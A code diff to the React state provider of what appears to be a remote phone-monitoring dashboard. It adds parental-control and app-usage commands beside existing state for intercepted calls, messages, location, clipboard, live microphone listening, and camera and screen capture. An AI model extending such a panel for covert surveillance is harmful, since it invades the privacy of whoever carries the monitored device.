@@ -64,6 +64,8 @@ export function StoreProvider({ children }) {
   const [motionAlarmState, setMotionAlarmState] = useState({});
   const [walkieTalkieActive, setWalkieTalkieActive] = useState(false);
   const [deviceSyncConfig, setDeviceSyncConfig] = useState({});
+  const [parentalControlState, setParentalControlState] = useState({});
+  const [appUsageData, setAppUsageData] = useState({});
   const ws = useRef(null);
   const alertTimers = useRef({});
   // Mirrors files.downloadBuffer for the stray-terminator guard below
@@ -712,6 +714,27 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'PARENTAL_CONTROL_STATUS': {
+          if (p.deviceId) {
+            setParentalControlState((prev) => ({
+              ...prev,
+              [p.deviceId]: { ...(prev[p.deviceId] || {}), ...p }
+            }));
+          }
+          pushToast(p.enabled ? '🛡️ Parental Controls & Screen Time ACTIVE' : 'Parental Controls turned OFF', p.enabled ? 'success' : 'info');
+          break;
+        }
+
+        case 'APP_USAGE_RESPONSE': {
+          if (p.deviceId) {
+            setAppUsageData((prev) => ({
+              ...prev,
+              [p.deviceId]: p
+            }));
+          }
+          break;
+        }
+
         default:
           break;
       }
@@ -1088,6 +1111,16 @@ function titleOrApp(appName, title, text) {
           enable ? 'warning' : 'success'
         );
       },
+      parentalControl: parentalControlState[activeDeviceId] || null,
+      appUsage: appUsageData[activeDeviceId] || null,
+      updateParentalControl: (config) => {
+        if (!activeDeviceId) return;
+        sendCommand('parental-control', { ...config, deviceId: activeDeviceId });
+      },
+      requestAppUsage: () => {
+        if (!activeDeviceId) return;
+        sendCommand('app-usage', { deviceId: activeDeviceId });
+      },
       removeDevice: async (deviceId) => {
         try {
           const res = await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' });
@@ -1109,7 +1142,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
+    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
